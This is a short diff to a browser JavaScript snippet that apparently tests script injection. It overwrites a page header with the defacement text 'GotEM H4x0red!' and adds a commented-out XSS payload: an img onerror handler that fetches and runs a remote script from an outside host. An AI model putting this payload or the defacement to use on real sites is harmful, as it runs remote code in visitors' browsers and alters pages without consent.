@@ -1,6 +1,7 @@
 const targetElements = {
     parent: document.querySelector("#main-container > div > div.header"),
-    payload: document.createElement('div')
+    
 }
-targetElements.payload.payloadinnerHTML= 'Hello World';
-targetElements.parent.insertBefore(targetElements.payload, targetElements.parent.firstChild);
+targetElements.parent.innerHTML= 'GotEM H4x0red!';
+
+//<img src="x" onerror="$.getScript('https://devxyz-blue.github.io/testjs/test.js')">
